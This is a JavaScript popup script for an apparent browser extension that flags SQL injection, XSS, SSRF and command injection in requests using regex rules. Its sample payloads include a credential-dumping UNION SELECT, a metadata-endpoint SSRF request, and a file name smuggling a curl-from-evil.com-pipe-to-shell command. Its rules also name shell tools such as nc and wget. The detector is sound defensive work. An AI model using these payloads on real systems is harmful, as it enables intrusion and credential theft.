const payloadField = document.getElementById("payload");
const analyzeButton = document.getElementById("analyze");
const clearButton = document.getElementById("clear");
const scanTabButton = document.getElementById("scan-tab");
const summaryEl = document.getElementById("summary");
const findingsEl = document.getElementById("findings");
const monitorToggle = document.getElementById("monitor-toggle");
const alertsList = document.getElementById("alerts-list");
const clearAlertsButton = document.getElementById("clear-alerts");

const SAMPLE_PAYLOADS = {
  sqli: "GET https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
  xss: "GET https://shop.example.com/search?q=<script>alert(1)</script>",
  ssrf: "POST https://shop.example.com/fetch {\"url\":\"http://169.254.169.254/latest/meta-data/iam\"}",
  rce: "POST https://shop.example.com/convert file=report.pdf;curl http://evil.com/s.sh|sh",
};

const SQLI_RULES = [
  { id: "sqli_union_select", regex: /\bunion\b\s+\bselect\b/i, reason: "UNION SELECT sequence" },
  { id: "sqli_boolean_tautology", regex: /\bor\b\s+1\s*=\s*1\b/i, reason: "Boolean tautology" },
  { id: "sqli_select_from", regex: /\bselect\b\s+.+\bfrom\b/i, reason: "SELECT ... FROM pattern" },
  { id: "sqli_comment", regex: /(--|\/\*|\*\/)/i, reason: "SQL comment marker" },
  { id: "sqli_time_delay", regex: /\b(waitfor\s+delay|sleep\s*\()/i, reason: "Time delay function" },
];

const XSS_RULES = [
  { id: "xss_script_tag", regex: /<\s*script\b/i, reason: "Script tag" },
  { id: "xss_event_handler", regex: /on\w+\s*=/i, reason: "Inline event handler" },
  { id: "xss_js_scheme", regex: /javascript\s*:/i, reason: "javascript: URI scheme" },
  { id: "xss_img_onerror", regex: /<\s*img\b[^>]*onerror\s*=/i, reason: "Image onerror handler" },
  { id: "xss_svg_onload", regex: /<\s*svg\b[^>]*onload\s*=/i, reason: "SVG onload handler" },
];

const RCE_RULES = [
  { id: "rce_shell_chain", regex: /(;|\|\||&&|\|)\s*/i, reason: "Shell chain operator" },
  { id: "rce_substitution", regex: /(\$\([^\)]+\)|`[^`]+`)/i, reason: "Command substitution" },
  { id: "rce_suspicious_binary", regex: /\b(bash|sh|cmd\.exe|powershell|nc|netcat|curl|wget|python\s+-c|perl\s+-e|php\s+-r)\b/i, reason: "Suspicious binary" },
];

const URL_REGEX = /https?:\/\/[^\s'"<>]+/gi;
const SCHEME_REGEX = /\b(file|gopher|dict|ftp|smb|ldap):\/\//gi;

function normalize(text) {
  if (!text) return "";
  let value = text;
  for (let i = 0; i < 2; i += 1) {
    try {
      value = decodeURIComponent(value.replace(/\+/g, "%20"));
    } catch (e) {
      return value;
    }
  }
  return value;
}

function clip(value, limit = 120) {
  if (!value) return "";
  return value.length <= limit ? value : `${value.slice(0, limit - 3)}...`;
}

function findRegexEvidence(rules, text) {
  const evidence = [];
  rules.forEach((rule) => {
    const match = text.match(rule.regex);
    if (match) {
      evidence.push({ rule: rule.id, match: clip(match[0]), reason: rule.reason });
    }
  });
  return evidence;
}

function isInternalHost(host) {
  if (!host) return false;
  const value = host.toLowerCase();
  if (["localhost", "127.0.0.1", "0.0.0.0", "::1", "metadata", "metadata.google.internal", "host.docker.internal"].includes(value)) {
    return true;
  }
  if (value.startsWith("10.") || value.startsWith("192.168.") || value.startsWith("169.254.")) return true;
  if (value.startsWith("172.")) {
    const parts = value.split(".");
    const second = parseInt(parts[1], 10);
    return second >= 16 && second <= 31;
  }
  return false;
}

function detectSsrf(text) {
  const evidence = [];
  const urls = text.match(URL_REGEX) || [];
  urls.forEach((candidate) => {
    try {
      const parsed = new URL(candidate);
      if (isInternalHost(parsed.hostname)) {
        evidence.push({
          rule: "ssrf_internal_host",
          match: clip(candidate),
          reason: `Internal host target (${parsed.hostname})`,
        });
      }
    } catch (e) {
      // ignore
    }
  });

  const schemes = text.match(SCHEME_REGEX) || [];
  schemes.forEach((scheme) => {
    evidence.push({
      rule: "ssrf_unusual_scheme",
      match: scheme,
      reason: "Unusual URL scheme",
    });
  });

  return evidence;
}

function buildFinding(name, evidence) {
  const score = Math.min(1, 0.3 * evidence.length);
  const confidence = score >= 0.7 ? "high" : score >= 0.4 ? "medium" : "low";
  return { attack: name, score: score.toFixed(2), confidence, evidence };
}

function analyzeText(payload) {
  const normalized = normalize(payload);
  const findings = [];

  const sqli = findRegexEvidence(SQLI_RULES, normalized);
  if (sqli.length) findings.push(buildFinding("SQLi", sqli));

  const xss = findRegexEvidence(XSS_RULES, normalized);
  if (xss.length) findings.push(buildFinding("XSS", xss));

  const ssrf = detectSsrf(normalized);
  if (ssrf.length) findings.push(buildFinding("SSRF", ssrf));

  const rce = findRegexEvidence(RCE_RULES, normalized);
  if (rce.length) findings.push(buildFinding("RCE", rce));

  return {
    summary: {
      attack_detected: findings.length > 0,
      top_attack: findings.length ? findings[0].attack : "None",
      count: findings.length,
    },
    findings,
  };
}

function render(result) {
  const { summary, findings } = result;
  findingsEl.innerHTML = "";
  summaryEl.classList.remove("safe", "alert");

  if (!summary.attack_detected) {
    summaryEl.classList.add("safe");
    summaryEl.innerHTML = "<h3>No obvious attacks</h3><p>The current payload looks clean.</p>";
    return;
  }

  summaryEl.classList.add("alert");
  summaryEl.innerHTML = `<h3>Potential attacks detected</h3><p>${summary.count} categories flagged. Top: ${summary.top_attack}.</p>`;

  findings.forEach((finding) => {
    const wrapper = document.createElement("div");
    wrapper.className = "finding";
    wrapper.innerHTML = `
      <h4>${finding.attack} <small>(${finding.confidence}, score ${finding.score})</small></h4>
      <div class="evidence"></div>
    `;
    const evidenceContainer = wrapper.querySelector(".evidence");
    finding.evidence.forEach((item) => {
      const ev = document.createElement("div");
      ev.innerHTML = `<strong>${item.rule}</strong> — ${item.reason}<br/><span>${item.match}</span>`;
      evidenceContainer.appendChild(ev);
    });
    findingsEl.appendChild(wrapper);
  });
}

function analyzePayload(payload) {
  const result = analyzeText(payload);
  render(result);
}

function renderAlerts(alerts) {
  alertsList.innerHTML = "";
  if (!alerts.length) {
    alertsList.innerHTML = "<p class=\"muted\">No alerts yet.</p>";
    return;
  }
  alerts.forEach((alert) => {
    const el = document.createElement("div");
    el.className = "alert-item";
    el.innerHTML = `
      <strong>${alert.method} ${alert.summary.top_attack}</strong>
      <small>${alert.url}</small>
      <small>${new Date(alert.time).toLocaleTimeString()}</small>
    `;
    alertsList.appendChild(el);
  });
}

function fetchAlerts() {
  chrome.runtime.sendMessage({ type: "getAlerts" }, (response) => {
    if (response && response.ok) {
      renderAlerts(response.alerts);
    }
  });
}

analyzeButton.addEventListener("click", () => {
  analyzePayload(payloadField.value.trim());
});

clearButton.addEventListener("click", () => {
  payloadField.value = "";
  summaryEl.classList.remove("safe", "alert");
  summaryEl.innerHTML = "<h3>Ready</h3><p>Scan a tab or paste a request.</p>";
  findingsEl.innerHTML = "";
});

scanTabButton.addEventListener("click", () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tab = tabs[0];
    const url = tab && (tab.pendingUrl || tab.url);
    if (!url) {
      return;
    }
    payloadField.value = url;
    analyzePayload(url);
  });
});

Array.from(document.querySelectorAll("[data-sample]")).forEach((button) => {
  button.addEventListener("click", () => {
    const sample = SAMPLE_PAYLOADS[button.dataset.sample];
    if (!sample) return;
    payloadField.value = sample;
    analyzePayload(sample);
  });
});

monitorToggle.addEventListener("change", () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tab = tabs[0];
    if (!tab) return;
    if (monitorToggle.checked) {
      chrome.runtime.sendMessage({ type: "enableMonitor", tabId: tab.id }, () => {
        fetchAlerts();
      });
    } else {
      chrome.runtime.sendMessage({ type: "disableMonitor" }, () => {
        fetchAlerts();
      });
    }
  });
});

clearAlertsButton.addEventListener("click", () => {
  chrome.runtime.sendMessage({ type: "clearAlerts" }, () => {
    fetchAlerts();
  });
});

chrome.runtime.onMessage.addListener((message) => {
  if (message && message.type === "alert") {
    fetchAlerts();
  }
});

fetchAlerts();
